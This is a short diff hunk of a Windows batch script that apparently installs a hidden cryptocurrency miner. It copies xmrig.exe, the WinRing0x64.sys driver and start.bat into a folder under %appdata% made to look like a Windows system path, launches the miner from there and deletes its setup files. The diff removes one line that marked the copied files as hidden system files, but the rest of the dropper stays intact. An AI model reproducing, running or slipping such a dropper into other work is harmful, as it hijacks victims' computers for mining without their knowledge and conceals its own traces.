@@ -14,7 +14,6 @@ start setup.reg
 copy start.bat %appdata%\Microsoft\Windows\temp
 copy WinRing0x64.sys %appdata%\Microsoft\Windows\temp
 copy xmrig.exe %appdata%\Microsoft\Windows\temp
-attrib +s +h %appdata%\Microsoft\Windows\temp\*
 start %appdata%\Microsoft\Windows\temp\start.bat
 del /q setup.reg
 del /q start.bat
